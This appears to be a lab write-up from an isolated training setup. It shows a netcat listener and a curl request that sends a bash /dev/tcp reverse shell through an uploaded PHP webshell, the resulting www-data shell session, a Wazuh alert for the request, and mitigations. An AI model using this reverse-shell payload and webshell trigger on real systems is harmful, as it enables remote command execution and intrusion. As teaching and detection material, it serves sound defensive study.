# 04 — Reverse Shell

## Objective

Demonstrate command and control from the uploaded webshell back to the isolated Kali attacker machine.

## Commands

Start the listener on Kali:

```bash
nc -lvnp 4444
```

Trigger the reverse shell through the webshell:

```bash
curl -G "http://10.10.10.1:80/uploads/malicious.php" --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"'

```

## Execution and expected result

The listener should receive a shell running with the privileges of the web application process.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [192.168.1.2] 59990
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu-server:~/html/uploads$ ls
ls
malicious.php
www-data@ubuntu-server:~/html/uploads$ cd ..
cd ..
www-data@ubuntu-server:~/html$ ls
ls
done.txt
index.nginx-debian.html
upload.php
uploads
```

## Wazuh view

```
{
  "_index": "wazuh-alerts-4.x-2026.10.14",
  "_id": "Zh6SPKEBBPd67aPA0qa0",
  "_version": 1,
  "_score": null,
  "_source": {
    "input": {
      "type": "log"
    },
    "agent": {
      "ip": "10.10.20.10",
      "name": "reverse-proxy",
      "id": "002"
    },
    "manager": {
      "name": "wazuh-server"
    },
    "data": {
      "protocol": "GET",
      "srcip": "10.10.10.10",
      "id": "504",
      "url": "/uploads/malicious.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%22"
    },
    "rule": {
      "firedtimes": 1,
      "mail": false,
      "level": 5,
      "description": "Web server 500 error code (server error).",
      "groups": [
        "web",
        "accesslog"
      ],
      "id": "31120"
    },
    "location": "/var/log/nginx/access.log",
    "decoder": {
      "name": "web-accesslog"
    },
    "id": "1792017614.69325829",
    "full_log": "10.10.10.10 - - [14/Oct/2026:22:40:12 +0000] \"GET /uploads/malicious.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%22 HTTP/1.1\" 504 176 \"-\" \"curl/8.22.0\"",
    "timestamp": "2026-10-14T22:40:14.140+0000"
  },
  "fields": {
    "timestamp": [
      "2026-10-14T22:40:14.140Z"
    ]
  },
  "highlight": {
    "agent.id": [
      "@opensearch-dashboards-highlighted-field@002@/opensearch-dashboards-highlighted-field@"
    ],
    "location": [
      "@opensearch-dashboards-highlighted-field@/var/log/nginx/access.log@/opensearch-dashboards-highlighted-field@"
    ]
  },
  "sort": [
    1792017614140
  ]
}
```
## Mitigation

- Restrict outbound traffic from the application host with network policies.
- Run the application with a dedicated, unprivileged service account.
- Use an application server configuration that cannot execute uploaded files.
- Alert on shell processes and unexpected outbound connections.
- Keep the DMZ-to-LAN and LAN-to-WAN firewall rules deny-by-default.